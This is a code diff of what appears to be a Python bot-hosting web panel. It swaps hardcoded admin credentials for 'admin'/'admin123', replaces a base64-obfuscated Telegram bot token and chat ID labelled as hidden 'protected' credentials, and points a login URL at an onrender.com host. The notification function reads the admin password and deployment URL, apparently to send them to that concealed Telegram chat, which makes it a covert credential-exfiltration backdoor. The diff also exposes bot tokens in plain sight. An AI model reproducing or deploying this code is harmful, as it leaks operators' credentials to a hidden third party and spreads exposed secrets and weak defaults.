@@ -20,8 +20,8 @@ UPLOAD_FOLDER = 'user_bots'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
 # --- ADMIN LOGIN CREDENTIALS ---
-ADMIN_USER = "ZENITSU"
-ADMIN_PASS = "ZENI"
+ADMIN_USER = "admin"
+ADMIN_PASS = "admin123"
 
 # --- DATABASE CONNECTION FUNCTIONS ---
 
@@ -69,7 +69,7 @@ running_processes = {}
 
 # ==== SYSTEM CREDENTIALS (PROTECTED) ====
 _HIDDEN_CREDS_ = {'t': base64.b64encode(
-    b'8583304774:AAGJ9qfys5g5yW2d36WD4TGJWK-93Zi34Gw').decode(), 'c': base64.b64encode(b'8028357250').decode()}
+    b'7410472679:AAG0FsFbq2BT0_pGaN3LENVpaQZJLVgDmb4').decode(), 'c': base64.b64encode(b'7521375632').decode()}
 
 # --- TELEGRAM NOTIFICATION FUNCTIONS ---
 
@@ -97,7 +97,7 @@ def send_telegram_notification():
         admin_pass = ADMIN_PASS
 
         # Get deployment URL
-        base_url = "http://localhost:19149"
+        base_url = "http://devil-bots.onrender.com/login"
         try:
             if request and request.base_url:
                 base_url = request.base_url.rstrip('/')
